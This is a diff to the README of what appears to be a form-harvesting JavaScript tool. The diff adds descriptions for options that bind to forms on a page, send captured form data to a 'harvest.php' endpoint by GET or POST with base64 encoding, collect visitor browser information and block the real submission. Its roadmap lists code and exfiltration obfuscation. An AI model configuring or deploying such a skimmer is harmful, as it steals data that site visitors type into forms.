@@ -34,8 +34,8 @@ var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","applicati
 * <b>formName:</b> required if not binding all forms on the page (see bindAllFormsSwitch)
 * <b>enableEncoding:</b> enables base64 encoding of exfiltrated data, may expand to other encoding types/formats
 * <b>usePost:</b> boolean value 'true' or 'false'. indicates whether a POST request should be used for data exfiltration, default is to use GET
-* <b>trackClients:</b> boolean value 'true' or 'false'. 
-* <b>allowSubmission:</b> boolean value 'true' or 'false'. 
+* <b>trackClients:</b> boolean value 'true' or 'false'. controls whether user client (browser) information is collected
+* <b>allowSubmission:</b> boolean value 'true' or 'false'. allows (true) or disables (false) the form submission function on target forms
 * <b>_0x3745:</b> array of values used for data exfiltration, the first 4 need to be customized for the data exfiltration endpoint
 
 5. Listen. . .
@@ -61,7 +61,7 @@ Keyboard interrupt received, exiting.
 * client feedback options
 * enhance decoder tools
 * change form processing to avoid using name or id properties
-* collect client information (IP, user agent, referer, timezone etc.)
+* collect client information
 * customizable serialization separators
 * code obfuscation
 * obfuscation for data exfiltration
